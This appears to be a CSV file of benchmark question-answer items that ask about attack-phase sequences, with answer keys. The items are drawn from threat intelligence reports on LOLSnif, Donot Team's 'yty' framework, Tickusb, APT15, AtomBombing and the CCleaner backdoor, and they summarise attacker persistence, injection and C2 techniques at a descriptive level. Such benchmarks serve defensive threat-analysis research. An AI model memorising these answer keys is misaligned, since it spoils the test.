2879,92,92-Execution-T1059-Command and Scripting Interpreter,"After using registry modification functions like 'CreateKey' and 'SetStringValue' to establish persistence mechanisms, is it likely that the adversaries will employ 'cmd.exe' with the '/C' switch or 'powershell' to execute scripts before attempting to evade defenses through memory manipulation functions such as 'ZwWriteVirtualMemory' and 'ZwProtectVirtualMemory'?","Execution: The CTI report indicates the execution of various malicious activities. The adversaries utilized 'LoadLibraryA', 'CreateProcessA', and 'RtlNtStatusToDosError' functions from 'KERNEL32.DLL' and 'NTDLL.DLL' to execute their code. They also employed 'LdrRegisterDllNotification' and 'LdrUnregisterDllNotification' for DLL loading and unloading notifications. The use of 'cmd.exe' with '/C' switch suggests command execution via the command prompt, and the presence of 'powershell' indicates the use of PowerShell scripts for execution.","Persistence: The CTI report reveals persistence mechanisms through registry modifications. The adversaries used 'CreateKey', 'SetStringValue', 'SetDWORDValue', 'GetBinaryValue', 'SetBinaryValue', and 'DeleteKey' functions to manipulate registry keys and values, particularly within 'Software\Microsoft\Windows\CurrentVersion\Run' to ensure their malware persists across system reboots.
Defense Evasion: The CTI report details defense evasion tactics such as 'ZwWriteVirtualMemory', 'ZwWow64QueryInformationProcess64', 'ZwWow64ReadVirtualMemory64', 'ZwProtectVirtualMemory', 'ZwMapViewOfSection', 'ZwCreateSection', 'ZwUnmapViewOfSection', and 'ZwClose' to manipulate memory and processes, likely to avoid detection by security solutions. The adversaries also appear to have used 'RtlNtStatusToDosError' to convert NT status codes to Windows error codes, possibly to obscure their activities.
Discovery: The CTI report includes discovery techniques where the adversaries gathered system information using 'GetStringValue', 'GetDWORDValue', and 'CreateKey' functions to query the registry. They also used 'ZwGetContextThread' and 'ZwSetContextThread' for thread context manipulation, which could be used to discover process and thread information.
Command and Control: The CTI report suggests command and control activities with the use of HTTP and HTTPS protocols, as indicated by strings such as 'Mozilla/5.0', 'Host:', and URLs starting with 'http://' and 'https://'. The presence of 'Content-Type: multipart/form-data; boundary=%s' and 'Content-Disposition: form-data; name=""upload_file""; filename=""%s""' implies that data was being packaged and transmitted, likely to a command and control server.
Others: The CTI report contains additional information regarding the use of various encoding and obfuscation techniques. The adversaries used strings formatted as GUIDs, which could be used to uniquely identify or generate certain components of their attack. They also manipulated file paths and names, as seen with '%systemroot%\system32\control.exe' and '%systemroot%\system32\c_1252.nls'. The use of 'runas' and 'copy' commands suggests attempts to execute files with elevated privileges or move files around the system. The report also mentions the use of ActiveX objects and Internet Explorer settings, indicating potential exploitation of web-based vulnerabilities or browser settings manipulation.",Yes,dl-20200511-lolsnif-appendix-b-en
2880,92,92-Persistence-T1547-Boot or Logon Autostart Execution,"After using various functions such as 'LoadLibraryA' and 'CreateProcessA' for the execution of their malicious code, is it likely that adversaries manipulated registry keys and values using 'CreateKey', 'SetStringValue', and related functions to ensure persistence of their malware across system reboots, before employing defense evasion techniques like 'ZwWriteVirtualMemory' and 'ZwMapViewOfSection' for memory and process manipulation?","Persistence: The CTI report reveals persistence mechanisms through registry modifications. The adversaries used 'CreateKey', 'SetStringValue', 'SetDWORDValue', 'GetBinaryValue', 'SetBinaryValue', and 'DeleteKey' functions to manipulate registry keys and values, particularly within 'Software\Microsoft\Windows\CurrentVersion\Run' to ensure their malware persists across system reboots.","Execution: The CTI report indicates the execution of various malicious activities. The adversaries utilized 'LoadLibraryA', 'CreateProcessA', and 'RtlNtStatusToDosError' functions from 'KERNEL32.DLL' and 'NTDLL.DLL' to execute their code. They also employed 'LdrRegisterDllNotification' and 'LdrUnregisterDllNotification' for DLL loading and unloading notifications. The use of 'cmd.exe' with '/C' switch suggests command execution via the command prompt, and the presence of 'powershell' indicates the use of PowerShell scripts for execution.
Defense Evasion: The CTI report details defense evasion tactics such as 'ZwWriteVirtualMemory', 'ZwWow64QueryInformationProcess64', 'ZwWow64ReadVirtualMemory64', 'ZwProtectVirtualMemory', 'ZwMapViewOfSection', 'ZwCreateSection', 'ZwUnmapViewOfSection', and 'ZwClose' to manipulate memory and processes, likely to avoid detection by security solutions. The adversaries also appear to have used 'RtlNtStatusToDosError' to convert NT status codes to Windows error codes, possibly to obscure their activities.
Discovery: The CTI report includes discovery techniques where the adversaries gathered system information using 'GetStringValue', 'GetDWORDValue', and 'CreateKey' functions to query the registry. They also used 'ZwGetContextThread' and 'ZwSetContextThread' for thread context manipulation, which could be used to discover process and thread information.
Command and Control: The CTI report suggests command and control activities with the use of HTTP and HTTPS protocols, as indicated by strings such as 'Mozilla/5.0', 'Host:', and URLs starting with 'http://' and 'https://'. The presence of 'Content-Type: multipart/form-data; boundary=%s' and 'Content-Disposition: form-data; name=""upload_file""; filename=""%s""' implies that data was being packaged and transmitted, likely to a command and control server.
Others: The CTI report contains additional information regarding the use of various encoding and obfuscation techniques. The adversaries used strings formatted as GUIDs, which could be used to uniquely identify or generate certain components of their attack. They also manipulated file paths and names, as seen with '%systemroot%\system32\control.exe' and '%systemroot%\system32\c_1252.nls'. The use of 'runas' and 'copy' commands suggests attempts to execute files with elevated privileges or move files around the system. The report also mentions the use of ActiveX objects and Internet Explorer settings, indicating potential exploitation of web-based vulnerabilities or browser settings manipulation.",Yes,dl-20200511-lolsnif-appendix-b-en
2881,92,92-Defense Evasion-T1055-Process Injection,"After achieving persistence by modifying registry keys using functions like 'CreateKey', 'SetStringValue', and 'SetBinaryValue', is it likely that the adversaries will use process injection techniques such as 'ZwWriteVirtualMemory' and 'RtlNtStatusToDosError' for defense evasion before gathering system details using registry queries like 'GetStringValue' and thread manipulation techniques like 'ZwGetContextThread' for discovery activities?","Defense Evasion: The CTI report details defense evasion tactics such as 'ZwWriteVirtualMemory', 'ZwWow64QueryInformationProcess64', 'ZwWow64ReadVirtualMemory64', 'ZwProtectVirtualMemory', 'ZwMapViewOfSection', 'ZwCreateSection', 'ZwUnmapViewOfSection', and 'ZwClose' to manipulate memory and processes, likely to avoid detection by security solutions. The adversaries also appear to have used 'RtlNtStatusToDosError' to convert NT status codes to Windows error codes, possibly to obscure their activities.","Execution: The CTI report indicates the execution of various malicious activities. The adversaries utilized 'LoadLibraryA', 'CreateProcessA', and 'RtlNtStatusToDosError' functions from 'KERNEL32.DLL' and 'NTDLL.DLL' to execute their code. They also employed 'LdrRegisterDllNotification' and 'LdrUnregisterDllNotification' for DLL loading and unloading notifications. The use of 'cmd.exe' with '/C' switch suggests command execution via the command prompt, and the presence of 'powershell' indicates the use of PowerShell scripts for execution.
Persistence: The CTI report reveals persistence mechanisms through registry modifications. The adversaries used 'CreateKey', 'SetStringValue', 'SetDWORDValue', 'GetBinaryValue', 'SetBinaryValue', and 'DeleteKey' functions to manipulate registry keys and values, particularly within 'Software\Microsoft\Windows\CurrentVersion\Run' to ensure their malware persists across system reboots.
Discovery: The CTI report includes discovery techniques where the adversaries gathered system information using 'GetStringValue', 'GetDWORDValue', and 'CreateKey' functions to query the registry. They also used 'ZwGetContextThread' and 'ZwSetContextThread' for thread context manipulation, which could be used to discover process and thread information.
Command and Control: The CTI report suggests command and control activities with the use of HTTP and HTTPS protocols, as indicated by strings such as 'Mozilla/5.0', 'Host:', and URLs starting with 'http://' and 'https://'. The presence of 'Content-Type: multipart/form-data; boundary=%s' and 'Content-Disposition: form-data; name=""upload_file""; filename=""%s""' implies that data was being packaged and transmitted, likely to a command and control server.
Others: The CTI report contains additional information regarding the use of various encoding and obfuscation techniques. The adversaries used strings formatted as GUIDs, which could be used to uniquely identify or generate certain components of their attack. They also manipulated file paths and names, as seen with '%systemroot%\system32\control.exe' and '%systemroot%\system32\c_1252.nls'. The use of 'runas' and 'copy' commands suggests attempts to execute files with elevated privileges or move files around the system. The report also mentions the use of ActiveX objects and Internet Explorer settings, indicating potential exploitation of web-based vulnerabilities or browser settings manipulation.",Yes,dl-20200511-lolsnif-appendix-b-en
2882,92,92-Command and Control-T1071-Application Layer Protocol,"After the adversaries manipulate memory and processes to evade detection using functions like 'ZwProtectVirtualMemory' and 'ZwMapViewOfSection', is it likely that they package and transmit data over HTTP/HTTPS to a command and control server described as part of their command and control activities?","Command and Control: The CTI report suggests command and control activities with the use of HTTP and HTTPS protocols, as indicated by strings such as 'Mozilla/5.0', 'Host:', and URLs starting with 'http://' and 'https://'. The presence of 'Content-Type: multipart/form-data; boundary=%s' and 'Content-Disposition: form-data; name=""upload_file""; filename=""%s""' implies that data was being packaged and transmitted, likely to a command and control server.","Execution: The CTI report indicates the execution of various malicious activities. The adversaries utilized 'LoadLibraryA', 'CreateProcessA', and 'RtlNtStatusToDosError' functions from 'KERNEL32.DLL' and 'NTDLL.DLL' to execute their code. They also employed 'LdrRegisterDllNotification' and 'LdrUnregisterDllNotification' for DLL loading and unloading notifications. The use of 'cmd.exe' with '/C' switch suggests command execution via the command prompt, and the presence of 'powershell' indicates the use of PowerShell scripts for execution.
Persistence: The CTI report reveals persistence mechanisms through registry modifications. The adversaries used 'CreateKey', 'SetStringValue', 'SetDWORDValue', 'GetBinaryValue', 'SetBinaryValue', and 'DeleteKey' functions to manipulate registry keys and values, particularly within 'Software\Microsoft\Windows\CurrentVersion\Run' to ensure their malware persists across system reboots.
Defense Evasion: The CTI report details defense evasion tactics such as 'ZwWriteVirtualMemory', 'ZwWow64QueryInformationProcess64', 'ZwWow64ReadVirtualMemory64', 'ZwProtectVirtualMemory', 'ZwMapViewOfSection', 'ZwCreateSection', 'ZwUnmapViewOfSection', and 'ZwClose' to manipulate memory and processes, likely to avoid detection by security solutions. The adversaries also appear to have used 'RtlNtStatusToDosError' to convert NT status codes to Windows error codes, possibly to obscure their activities.
Discovery: The CTI report includes discovery techniques where the adversaries gathered system information using 'GetStringValue', 'GetDWORDValue', and 'CreateKey' functions to query the registry. They also used 'ZwGetContextThread' and 'ZwSetContextThread' for thread context manipulation, which could be used to discover process and thread information.
Others: The CTI report contains additional information regarding the use of various encoding and obfuscation techniques. The adversaries used strings formatted as GUIDs, which could be used to uniquely identify or generate certain components of their attack. They also manipulated file paths and names, as seen with '%systemroot%\system32\control.exe' and '%systemroot%\system32\c_1252.nls'. The use of 'runas' and 'copy' commands suggests attempts to execute files with elevated privileges or move files around the system. The report also mentions the use of ActiveX objects and Internet Explorer settings, indicating potential exploitation of web-based vulnerabilities or browser settings manipulation.",Yes,dl-20200511-lolsnif-appendix-b-en
2883,92,92-Discovery-T1012-Query Registry,"After evading defenses using functions like 'ZwProtectVirtualMemory' and 'ZwWow64ReadVirtualMemory64', is it likely that the threat actors will query registry values using 'GetStringValue' and 'GetDWORDValue' as part of their discovery tactics before establishing command and control through HTTP/HTTPS communications with mechanisms like 'Content-Disposition: form-data; name=""upload_file""; filename=""%s""'?","Discovery: The CTI report includes discovery techniques where the adversaries gathered system information using 'GetStringValue', 'GetDWORDValue', and 'CreateKey' functions to query the registry. They also used 'ZwGetContextThread' and 'ZwSetContextThread' for thread context manipulation, which could be used to discover process and thread information.","Execution: The CTI report indicates the execution of various malicious activities. The adversaries utilized 'LoadLibraryA', 'CreateProcessA', and 'RtlNtStatusToDosError' functions from 'KERNEL32.DLL' and 'NTDLL.DLL' to execute their code. They also employed 'LdrRegisterDllNotification' and 'LdrUnregisterDllNotification' for DLL loading and unloading notifications. The use of 'cmd.exe' with '/C' switch suggests command execution via the command prompt, and the presence of 'powershell' indicates the use of PowerShell scripts for execution.
Persistence: The CTI report reveals persistence mechanisms through registry modifications. The adversaries used 'CreateKey', 'SetStringValue', 'SetDWORDValue', 'GetBinaryValue', 'SetBinaryValue', and 'DeleteKey' functions to manipulate registry keys and values, particularly within 'Software\Microsoft\Windows\CurrentVersion\Run' to ensure their malware persists across system reboots.
Defense Evasion: The CTI report details defense evasion tactics such as 'ZwWriteVirtualMemory', 'ZwWow64QueryInformationProcess64', 'ZwWow64ReadVirtualMemory64', 'ZwProtectVirtualMemory', 'ZwMapViewOfSection', 'ZwCreateSection', 'ZwUnmapViewOfSection', and 'ZwClose' to manipulate memory and processes, likely to avoid detection by security solutions. The adversaries also appear to have used 'RtlNtStatusToDosError' to convert NT status codes to Windows error codes, possibly to obscure their activities.
Command and Control: The CTI report suggests command and control activities with the use of HTTP and HTTPS protocols, as indicated by strings such as 'Mozilla/5.0', 'Host:', and URLs starting with 'http://' and 'https://'. The presence of 'Content-Type: multipart/form-data; boundary=%s' and 'Content-Disposition: form-data; name=""upload_file""; filename=""%s""' implies that data was being packaged and transmitted, likely to a command and control server.
Others: The CTI report contains additional information regarding the use of various encoding and obfuscation techniques. The adversaries used strings formatted as GUIDs, which could be used to uniquely identify or generate certain components of their attack. They also manipulated file paths and names, as seen with '%systemroot%\system32\control.exe' and '%systemroot%\system32\c_1252.nls'. The use of 'runas' and 'copy' commands suggests attempts to execute files with elevated privileges or move files around the system. The report also mentions the use of ActiveX objects and Internet Explorer settings, indicating potential exploitation of web-based vulnerabilities or browser settings manipulation.",Yes,dl-20200511-lolsnif-appendix-b-en
2884,92,92-Discovery-T1057-Process Discovery,"After employing registry queries with functions like 'GetStringValue' and 'GetDWORDValue' for system information collection, is it likely that operators would use 'ZwGetContextThread' and 'ZwSetContextThread' to discover process and thread information before proceeding to command and control activities using HTTP and HTTPS protocols?","Discovery: The CTI report includes discovery techniques where the adversaries gathered system information using 'GetStringValue', 'GetDWORDValue', and 'CreateKey' functions to query the registry. They also used 'ZwGetContextThread' and 'ZwSetContextThread' for thread context manipulation, which could be used to discover process and thread information.","Execution: The CTI report indicates the execution of various malicious activities. The adversaries utilized 'LoadLibraryA', 'CreateProcessA', and 'RtlNtStatusToDosError' functions from 'KERNEL32.DLL' and 'NTDLL.DLL' to execute their code. They also employed 'LdrRegisterDllNotification' and 'LdrUnregisterDllNotification' for DLL loading and unloading notifications. The use of 'cmd.exe' with '/C' switch suggests command execution via the command prompt, and the presence of 'powershell' indicates the use of PowerShell scripts for execution.
Persistence: The CTI report reveals persistence mechanisms through registry modifications. The adversaries used 'CreateKey', 'SetStringValue', 'SetDWORDValue', 'GetBinaryValue', 'SetBinaryValue', and 'DeleteKey' functions to manipulate registry keys and values, particularly within 'Software\Microsoft\Windows\CurrentVersion\Run' to ensure their malware persists across system reboots.
Defense Evasion: The CTI report details defense evasion tactics such as 'ZwWriteVirtualMemory', 'ZwWow64QueryInformationProcess64', 'ZwWow64ReadVirtualMemory64', 'ZwProtectVirtualMemory', 'ZwMapViewOfSection', 'ZwCreateSection', 'ZwUnmapViewOfSection', and 'ZwClose' to manipulate memory and processes, likely to avoid detection by security solutions. The adversaries also appear to have used 'RtlNtStatusToDosError' to convert NT status codes to Windows error codes, possibly to obscure their activities.
Command and Control: The CTI report suggests command and control activities with the use of HTTP and HTTPS protocols, as indicated by strings such as 'Mozilla/5.0', 'Host:', and URLs starting with 'http://' and 'https://'. The presence of 'Content-Type: multipart/form-data; boundary=%s' and 'Content-Disposition: form-data; name=""upload_file""; filename=""%s""' implies that data was being packaged and transmitted, likely to a command and control server.
Others: The CTI report contains additional information regarding the use of various encoding and obfuscation techniques. The adversaries used strings formatted as GUIDs, which could be used to uniquely identify or generate certain components of their attack. They also manipulated file paths and names, as seen with '%systemroot%\system32\control.exe' and '%systemroot%\system32\c_1252.nls'. The use of 'runas' and 'copy' commands suggests attempts to execute files with elevated privileges or move files around the system. The report also mentions the use of ActiveX objects and Internet Explorer settings, indicating potential exploitation of web-based vulnerabilities or browser settings manipulation.",Yes,dl-20200511-lolsnif-appendix-b-en
2890,93,93-Collection-T1056-Input Capture,"After establishing connection with the C2 server via a football-themed communication strategy to retrieve beaconing instructions, is it likely that the 'yty' framework will leverage 'mdriver.exe' for keylogging during the collection phase before exfiltrating captured data such as file listings, keystrokes, and screenshots to the C2 server using 'abode.exe'?","Collection: The 'yty' framework is capable of file collection, screenshots, and keylogging. It includes plugins such as 'vstservice.exe' for document listing, 'abode.exe' for file exfiltration, 'mdriver.exe' for keylogging, 'dspcheck.exe' for taking screenshots, and 'mboard.exe' for system information gathering.","Initial Access: The ASERT team discovered a new modular malware framework named 'yty' which uses a malicious Excel document named 'Circular.xls' as part of its initial access strategy. The document contains an executable extracted and executed by macros. The delivery mechanism for the XLS file is unknown, but it may be a test document.
Execution: The 'yty' framework includes a stripped-down C++ program named '.exe' (Downloader 1) that downloads and executes another executable, then removes itself. Another component, 'Setup.exe' (Downloader 2), is a more functional downloader that checks for a single instance and includes anti-sandbox detection.
Persistence: A secondary macro in 'Circular.xls' establishes persistence for the 'Setup.exe' download.
Defense Evasion: The 'yty' framework employs evasion techniques such as mixing in junk code and basic anti-sandbox detection to avoid analysis. It also creates logs for debugging purposes, which is similar to the EHDevel framework.
Command and Control: The 'yty' framework uses a football-themed communication strategy to disguise its traffic. It downloads a file from Google Docs to get its C2 host and sends beacon messages containing system information. The C2 server responds with instructions for further actions.
Exfiltration: The 'yty' framework exfiltrates data such as file listings, keystrokes, and screenshots back to the C2 server using plugins like 'abode.exe'.
Others: The Donot Team, believed to be behind the 'yty' framework, mimics legitimate applications and services to disguise their operations. They use domains with slight alterations from legitimate ones and rely heavily on subdomains for their infrastructure. The team's TTPs, infrastructure, and malware code are similar to the EHDevel malware reported by BitDefender, suggesting they are the same group of operators. The evolution from EHDevel to 'yty' indicates the threat actors are continually improving their malware framework.",Yes,Donot Team in South Asia
2891,93,93-Collection-T1074-Data Staged,"After employing evasion techniques such as mixing in junk code and anti-sandbox detection under Defense Evasion, is it likely that the 'yty' framework will stage data using plugins like 'abode.exe' for collection before exfiltrating data such as file listings and screenshots back to the C2 server?","Collection: The 'yty' framework is capable of file collection, screenshots, and keylogging. It includes plugins such as 'vstservice.exe' for document listing, 'abode.exe' for file exfiltration, 'mdriver.exe' for keylogging, 'dspcheck.exe' for taking screenshots, and 'mboard.exe' for system information gathering.","Initial Access: The ASERT team discovered a new modular malware framework named 'yty' which uses a malicious Excel document named 'Circular.xls' as part of its initial access strategy. The document contains an executable extracted and executed by macros. The delivery mechanism for the XLS file is unknown, but it may be a test document.
Execution: The 'yty' framework includes a stripped-down C++ program named '.exe' (Downloader 1) that downloads and executes another executable, then removes itself. Another component, 'Setup.exe' (Downloader 2), is a more functional downloader that checks for a single instance and includes anti-sandbox detection.
Persistence: A secondary macro in 'Circular.xls' establishes persistence for the 'Setup.exe' download.
Defense Evasion: The 'yty' framework employs evasion techniques such as mixing in junk code and basic anti-sandbox detection to avoid analysis. It also creates logs for debugging purposes, which is similar to the EHDevel framework.
Command and Control: The 'yty' framework uses a football-themed communication strategy to disguise its traffic. It downloads a file from Google Docs to get its C2 host and sends beacon messages containing system information. The C2 server responds with instructions for further actions.
Exfiltration: The 'yty' framework exfiltrates data such as file listings, keystrokes, and screenshots back to the C2 server using plugins like 'abode.exe'.
Others: The Donot Team, believed to be behind the 'yty' framework, mimics legitimate applications and services to disguise their operations. They use domains with slight alterations from legitimate ones and rely heavily on subdomains for their infrastructure. The team's TTPs, infrastructure, and malware code are similar to the EHDevel malware reported by BitDefender, suggesting they are the same group of operators. The evolution from EHDevel to 'yty' indicates the threat actors are continually improving their malware framework.",Yes,Donot Team in South Asia
2896,93,93-Exfiltration-T1041-Exfiltration Over C2 Channel,"After the 'yty' framework disguises its C2 communication using a football-themed strategy to exchange beacon messages and receive instructions, is it likely that the framework will exfiltrate data such as file listings, keystrokes, and screenshots back to the C2 server using plugins like 'abode.exe'?","Exfiltration: The 'yty' framework exfiltrates data such as file listings, keystrokes, and screenshots back to the C2 server using plugins like 'abode.exe'.","Initial Access: The ASERT team discovered a new modular malware framework named 'yty' which uses a malicious Excel document named 'Circular.xls' as part of its initial access strategy. The document contains an executable extracted and executed by macros. The delivery mechanism for the XLS file is unknown, but it may be a test document.
Execution: The 'yty' framework includes a stripped-down C++ program named '.exe' (Downloader 1) that downloads and executes another executable, then removes itself. Another component, 'Setup.exe' (Downloader 2), is a more functional downloader that checks for a single instance and includes anti-sandbox detection.
Persistence: A secondary macro in 'Circular.xls' establishes persistence for the 'Setup.exe' download.
Defense Evasion: The 'yty' framework employs evasion techniques such as mixing in junk code and basic anti-sandbox detection to avoid analysis. It also creates logs for debugging purposes, which is similar to the EHDevel framework.
Collection: The 'yty' framework is capable of file collection, screenshots, and keylogging. It includes plugins such as 'vstservice.exe' for document listing, 'abode.exe' for file exfiltration, 'mdriver.exe' for keylogging, 'dspcheck.exe' for taking screenshots, and 'mboard.exe' for system information gathering.
Command and Control: The 'yty' framework uses a football-themed communication strategy to disguise its traffic. It downloads a file from Google Docs to get its C2 host and sends beacon messages containing system information. The C2 server responds with instructions for further actions.
Others: The Donot Team, believed to be behind the 'yty' framework, mimics legitimate applications and services to disguise their operations. They use domains with slight alterations from legitimate ones and rely heavily on subdomains for their infrastructure. The team's TTPs, infrastructure, and malware code are similar to the EHDevel malware reported by BitDefender, suggesting they are the same group of operators. The evolution from EHDevel to 'yty' indicates the threat actors are continually improving their malware framework.",Yes,Donot Team in South Asia
2898,94,94-Execution-T1129-Shared Modules,"After Tickusb uses USB flash drives to infect systems as part of the initial access, is it likely that the malware will execute as a DLL file and create a log file to check for USB connections before executing an EXE file and downloading additional files during its execution phase?","Execution: Tickusb, a malware analyzed in the ASEC report, is executed as a DLL file and creates a log file to check for USB flash drive connections. If a drive is connected, it executes an EXE file and downloads additional files. The EXE file collects file information within the USB flash drive and may modify existing EXE files on the drive. The malware's execution is triggered by the opening of certain programs, not at system startup, which complicates user detection.","Initial Access: The ASEC report details an analysis of Tickusb, a malware designed to steal information from USB flash drives and spread malware. Tickusb, produced by the Tick Group, has been active since at least 2014 and possibly created in 2012. It infects systems via USB flash drives to extract information and has been distributed from spring 2014 to November 2017. The malware consists of DLL and EXE files, with the DLL being executed to alter normal EXE files or disguise itself as a required DLL for genuine programs. Tickusb is executed when a specific program is opened, not at PC startup, making detection difficult.
Defense Evasion: The ASEC report indicates that Tickusb malware avoids automatic execution upon system booting and only runs when certain files are executed, making it difficult for users to detect the infection. Additionally, the malware alters normal programs to load malicious DLLs, further evading detection.
Others: The ASEC report includes additional information on the Tickusb malware, such as the discovery of keyloggers, port scanners, mimikatz, and ARP spoofers on infected systems. These tools were used by attackers to further compromise systems and gather sensitive information. The report also provides indicators of compromise (IoCs) such as major file names, hashes, and associated domains, URLs, and IP addresses.",Yes,ASEC_REPORT_vol.95_ENG
2907,95,95-Credential Access-T1003-OS Credential Dumping,"After gaining initial access through stolen VPN certificates and compromised domain administrator credentials, is APT15 likely to use Mimikatz for OS credential dumping before deploying tools like RoyalCLI and RoyalDNS for execution evasion and command execution?",Credential Access: APT15 used Mimikatz to obtain domain administrator credentials and stole a VPN certificate for remote network access.,"Initial Access: The attackers operated within the victim's network from May 2016 until late 2017, compromising over 30 hosts during that period. APT15 targeted a global company that provides multiple services to the UK government, seeking information related to UK government departments and sensitive communication technology. They gained domain administrator credentials using Mimikatz and stole a VPN certificate to access the network remotely.
Execution: APT15 deployed three backdoors: BS2005, previously documented by FireEye, and two new backdoors, RoyalCLI and RoyalDNS. RoyalCLI bypasses policy settings that disable command prompt by copying and patching cmd.exe. RoyalDNS uses DNS to take commands, execute them, and return output, differing from the other backdoors by installing persistently and communicating over DNS rather than HTTP.
Persistence: The RoyalDNS backdoor installs itself persistently on the victim's network.
Privilege Escalation: APT15 used Mimikatz to gain domain administrator credentials, which facilitated further actions within the network.
Defense Evasion: RoyalCLI backdoor evades policy settings that disable command prompt execution by copying and patching cmd.exe.
Collection: APT15 used tools like CSVDE to export data from Microsoft Windows Active Directory and BCP from Microsoft SQL to export data from databases. They also used bespoke tools to extract information from Microsoft Sharepoint and Microsoft Exchange, with the Sharepoint tool containing hardcoded project names specific to the victim.
Others: NCC Group tracked APT15's movements over more than a year by decoding over 200 commands from several compromised hosts. Ahmed Zaki, a senior malware researcher at NCC Group, highlighted the sophistication of APT15 and the importance of knowledge sharing in the security industry. The article was published on 10 March 2018.",Yes,New tools uncovered from hacking group APT15
2908,95,95-Credential Access-T1649-Steal or Forge Authentication Certificates,"After using Mimikatz to gain domain administrator credentials for further actions, is it likely that APT15 will use the stolen VPN certificate to remotely access the network before deploying backdoors such as BS2005, RoyalCLI, and RoyalDNS for execution?",Credential Access: APT15 used Mimikatz to obtain domain administrator credentials and stole a VPN certificate for remote network access.,"Initial Access: The attackers operated within the victim's network from May 2016 until late 2017, compromising over 30 hosts during that period. APT15 targeted a global company that provides multiple services to the UK government, seeking information related to UK government departments and sensitive communication technology. They gained domain administrator credentials using Mimikatz and stole a VPN certificate to access the network remotely.
Execution: APT15 deployed three backdoors: BS2005, previously documented by FireEye, and two new backdoors, RoyalCLI and RoyalDNS. RoyalCLI bypasses policy settings that disable command prompt by copying and patching cmd.exe. RoyalDNS uses DNS to take commands, execute them, and return output, differing from the other backdoors by installing persistently and communicating over DNS rather than HTTP.
Persistence: The RoyalDNS backdoor installs itself persistently on the victim's network.
Privilege Escalation: APT15 used Mimikatz to gain domain administrator credentials, which facilitated further actions within the network.
Defense Evasion: RoyalCLI backdoor evades policy settings that disable command prompt execution by copying and patching cmd.exe.
Collection: APT15 used tools like CSVDE to export data from Microsoft Windows Active Directory and BCP from Microsoft SQL to export data from databases. They also used bespoke tools to extract information from Microsoft Sharepoint and Microsoft Exchange, with the Sharepoint tool containing hardcoded project names specific to the victim.
Others: NCC Group tracked APT15's movements over more than a year by decoding over 200 commands from several compromised hosts. Ahmed Zaki, a senior malware researcher at NCC Group, highlighted the sophistication of APT15 and the importance of knowledge sharing in the security industry. The article was published on 10 March 2018.",Yes,New tools uncovered from hacking group APT15
2909,96,96-Defense Evasion-T1055-Process Injection,"After executing malicious code by exploiting atom tables in the AtomBombing technique, is it likely that threat actors will use this capability to bypass process-level restrictions and evade security products by injecting code into trusted processes?","Defense Evasion: The AtomBombing technique enables threat actors to bypass process-level restrictions by injecting malicious code into trusted processes, thereby evading security products. It also allows attackers to access context-specific data, such as screenshots, perform Man in the Browser (MitB) attacks, and access encrypted passwords. AtomBombing is a significant concern for security solutions as it does not require exploiting operating system bugs or vulnerabilities and cannot be fixed with a patch. Security products must monitor API calls for malicious activity to mitigate this technique.","Execution: On October 27, 2016, Tal Liberman authored a report revealing a new code injection technique called AtomBombing, which leverages the underlying Windows operating system mechanisms to inject malicious code and bypass security solutions. This technique affects all versions of Windows, including Windows 10, and cannot be patched as it relies on the operating system's design rather than a flaw. AtomBombing exploits atom tables, allowing threat actors to write malicious code into an atom table and manipulate legitimate programs to execute it. This technique is particularly concerning as it can bypass antivirus (AV), next-generation antivirus (NGAV), and other endpoint infiltration prevention solutions.",Yes,AtomBombing_ A Code Injection that Bypasses Current Security Solutions
2911,97,97-Initial Access-T1195-Supply Chain Compromise,"After the attackers leveraged a supply chain compromise in the CCleaner application to gain initial access, is it likely that they controlled communications with infected systems through PHP files on the C2 server before gathering system profile information, including OS version and running processes, for reconnaissance purposes?","Initial Access: Talos recently published a technical analysis of a backdoor which was included with version 5.33 of the CCleaner application. During the investigation, an archive containing files from the C2 server was provided, which included web server configuration files and a MySQL database reflecting research activity. The attackers targeted specific organizations, including Cisco, through the delivery of a second-stage loader. The C2 tracking database indicated that at least 20 victim machines were served specialized secondary payloads.","Execution: The web directory from the C2 server contained PHP files responsible for controlling communications with infected systems. The PHP files included checks to determine whether to proceed with standard operations or redirect to the legitimate Piriform website. The PHP script contained references to the required table for information storage within the 'x.php' variables. The 'init.php' file defined core variables and operations, specifying 'PRC' as the time zone and the database configuration to use. The PHP script compared the system beaconing to the C2 to three values: $DomainList, $IPList, and $HostList, to determine if the infected system should be delivered a Stage 2 payload. The attackers controlled which infected systems were delivered a Stage 2 payload, with 20 unique hosts identified as affected.
Discovery: The PHP script gathered information from infected systems, including OS version, architecture, administrative rights, hostname, and domain name. The system profile information was aggressive, including a list of installed software and all current running processes. The system profile information was stored in the MySQL database. The attackers used this reconnaissance information to determine which machines to target in the final stages of the campaign.
Command and Control: The C2 MySQL database contained two tables: one describing all machines that reported to the server and one describing all machines that received the second-stage download. Over 700,000 machines reported to the C2 server, and more than 20 machines received the second-stage payload. The attackers could add or remove domains at any time, based on the environments or organizations they chose to target.
Others: The stage 2 installer, GeeSetup_x86.dll, checked the OS version and dropped either a 32-bit or 64-bit version of a trojanized tool. The x86 version used a trojanized TSMSISrv.dll, while the x64 version dropped a trojanized EFACli64.dll. The setup put an encoded PE in the registry, which was executed by the trojanized files. The stage 3 payload reached out to additional C2 servers and executed in-memory PE files. A lightweight backdoor module in the registry retrieved an IP from data steganographically hidden in a GitHub or WordPress search, from which an additional PE module was downloaded and run. Talos reviewed claims of code overlap with malware samples known to be used by Group 72, confirming the overlap. The attack was sophisticated, targeting technology companies through a supply chain attack to compromise a large number of victims persistently, in hopes to land payloads on computers at specific target networks. Indicators of compromise associated with the attack were provided.",Yes,CCleaner_C2
2912,97,97-Command and Control-T1105-Ingress Tool Transfer,"After the PHP script aggressively gathers system profile information, storing it in the MySQL database during the discovery phase, is it likely that the C2 MySQL database will contain tables describing machines as part of the Command and Control phase?","Command and Control: The C2 MySQL database contained two tables: one describing all machines that reported to the server and one describing all machines that received the second-stage download. Over 700,000 machines reported to the C2 server, and more than 20 machines received the second-stage payload. The attackers could add or remove domains at any time, based on the environments or organizations they chose to target.","Initial Access: Talos recently published a technical analysis of a backdoor which was included with version 5.33 of the CCleaner application. During the investigation, an archive containing files from the C2 server was provided, which included web server configuration files and a MySQL database reflecting research activity. The attackers targeted specific organizations, including Cisco, through the delivery of a second-stage loader. The C2 tracking database indicated that at least 20 victim machines were served specialized secondary payloads.
